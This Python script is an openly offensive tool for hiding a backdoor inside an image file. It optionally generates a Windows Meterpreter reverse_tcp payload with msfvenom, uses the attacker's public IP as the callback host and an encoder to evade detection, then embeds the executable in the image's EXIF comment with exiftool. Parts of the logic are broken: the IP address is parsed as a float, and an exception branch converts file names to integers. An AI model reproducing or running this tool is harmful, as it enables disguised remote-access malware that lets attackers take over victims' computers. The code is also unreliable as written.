import os
import sys
from termcolor import colored


def mal():
	print(colored('Be Sure To Have Backdoor And Image In The Same Directory As This Program', 'yellow'))

	# if image file starts with a letter
	try:
		q1 = input('Do You Have A Backdoor Created Already [y/n]:\n> ')
		if q1 == 'y':
			image = input('Title Of The Image You Want To Store Backdoor Into:\n> ')
			bd = input('Title Of The Backdoor File:\n> ')
			tool = f'exiftool "-comment<={bd}" {image}'
			os.system(tool)

			print(colored('Checking If Image Has Succesfully Embedded', 'yellow'))
			cmd = f'strings {image} | grep system'
			os.system(cmd)

		elif q1 == 'n':
			ip = 'curl ifconfig.me'
			print(colored('Copy Your Public IP Address Below', 'yellow'))
			os.system(ip)
			PUB = float(input('Paste Here:\n> '))
			venom = f'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={PUB} LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe > payload.exe'
			os.system(venom)
			image = input('Title Of The Image You Want To Store Backdoor Into:\n> ')
			bd = 'payload.exe'
			tool = f'exiftool "-comment<={bd}" {image}'
			os.system(tool)

			print(colored('Checking If Image Has Succesfully Embedded', 'yellow'))
			cmd = f'strings {image} | grep system'
			os.system(cmd)

		else:
			print(colored('Error Occured', 'red'))

	# if image file starts with a number
	except:
		q1 = input('Do You Have A Backdoor Created Already [y/n]:\n> ')
		if q1 == 'y':
			image = int(input('Title Of The Image You Want To Store Backdoor Into:\n> '))
			bd = input('Title Of The Backdoor File:\n> ')
			tool = f'exiftool "-comment<={bd}" {image}'
			os.system(tool)

			print(colored('Checking If Image Has Succesfully Embedded', 'yellow'))
			cmd = f'strings {image} | grep system'
			os.system(cmd)

		elif q1 == 'n':
			ip = 'curl ifconfig.me'
			print(colored('Copy Your Public IP Address Below', 'yellow'))
			os.system(ip)
			PUB = float(input('Paste Here:\n> '))
			venom = f'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={PUB} LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe > payload.exe'
			os.system(venom)
			image = input('Title Of The Image You Want To Store Backdoor Into:\n> ')
			bd = 'payload.exe'
			tool = f'exiftool "-comment<={bd}" {image}'
			os.system(tool)

			print(colored('Checking If Image Has Succesfully Embedded', 'yellow'))
			cmd = f'strings {image} | grep system'
			os.system(cmd)

		else:
			print(colored('Error Occured', 'red'))
